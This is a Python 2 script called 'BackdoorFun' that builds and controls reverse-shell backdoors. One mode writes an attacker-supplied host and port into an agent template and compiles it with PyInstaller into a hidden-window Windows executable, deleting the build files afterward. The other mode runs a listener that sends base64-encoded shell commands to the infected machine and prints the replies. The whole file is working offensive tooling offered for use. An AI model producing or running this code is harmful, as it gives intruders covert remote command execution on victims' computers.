#!/usr/bin/python 
import socket
import base64
import sys
import string
import platform
import os
import shutil
banner="""
______            _       _                   ______            
| ___ \          | |     | |                  |  ___|           
| |_/ / __ _  ___| | ____| | ___   ___  _ __  | |_ _   _ _ __   
| ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__| |  _| | | | '_ \  
| |_/ / (_| | (__|   < (_| | (_) | (_) | |    | | | |_| | | | | 
\____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|    \_|  \__,_|_| |_| 
                                                                
                                                                
[+]Author : abbas jahanbakhsh (abbasmain92@gmail.com)
"""
os1=""
if platform.system() == "Windows" :
	os.system("cls")
	os1="cls"
if platform.system() == "Linux" :

	os.system("clear")
	os1="clear"
print banner	
print "1-Generate Agent (Reverse Shell)\r\n\r\n2-Listener\r\n"
out=os.getcwd()+"\\out\\"
if not os.path.exists(out):
    os.makedirs(out)
def dell(name):
		rmpath=os.getcwd()+"\\build"
		shutil.rmtree(rmpath)
		src=os.getcwd()+"\\dist\\"+name+".exe"
		dst=os.getcwd()+"\\out\\"+name+".exe"
		shutil.copy2(src,dst)
		src=os.getcwd()+"\\dist\\"
		shutil.rmtree(src)
		src=name+".spec"
		os.remove(src)
		src=name+".py"
		os.remove(src)

while True:
	mod=raw_input("BackdoorFun>")
	if mod == "1" :
		print "insert LHOST:LPORT(e.g 192.168.1.1:8585)\r\n"
		inp=raw_input("insert LHOST:LPORT : ")
		nfile=raw_input("insert file name:")
		pyfile=nfile+".py"
		inp=inp.split(":")
		host=inp[0]
		
		port=inp[1]
		agent_open=open("temp.py","r")
		out_open=open(pyfile,"w+")
		for i in agent_open :
			if "#Port" in i :
				
				out_open.write("port=")
				out_open.write(port)
				out_open.write("\r\n")
				continue
				
			if "#Host" in i :
				out_open.write("host='")
				out_open.write(host)
				out_open.write("'")
				out_open.write("\r\n")
				continue
			out_open.write(i)
		out_open.close()
		agent_open.close()
		pytoexe='pyinstaller -y -F -w  "'+pyfile+'"'
		print "[*]Compiling Backdoor..."
		
		
		os.popen(pytoexe)
		dell(nfile)
		path1=os.getcwd()+"\\out\\"+nfile+".exe"
		print "[*]Saved To "+path1
	if mod == "2" :
		host=raw_input("insert Your ip For Listen:")
		port=input("insert your port For Listen:")
		break
symb={"changedir":"$1%","download":"$2%","upload":"$3%"}               
s = socket.socket()         

s.bind((host, port))        
os.system(os1)
print banner
print "[*]Started Reverse Handler on "+host+":"+str(port)
print "\r\n[*]Listening...\r\n"
s.listen(5)  
c, addr = s.accept() 
print '[+]Got connection from', addr[0]
              
while True:

		command=raw_input("EXECUTE>")
		if len(command) > 0 :
			if command == "exit" :
				command=base64.b64encode(command)
				c.send(command)
				break
			if command[:3].find("cd ") >= 0 :
				command=symb['changedir']+string.replace(command,"cd ","")
			
				
				
			command=base64.b64encode(command)
			
			c.send(command)
			
			print base64.b64decode(c.recv(100000))
			
		

	
	
c.close()
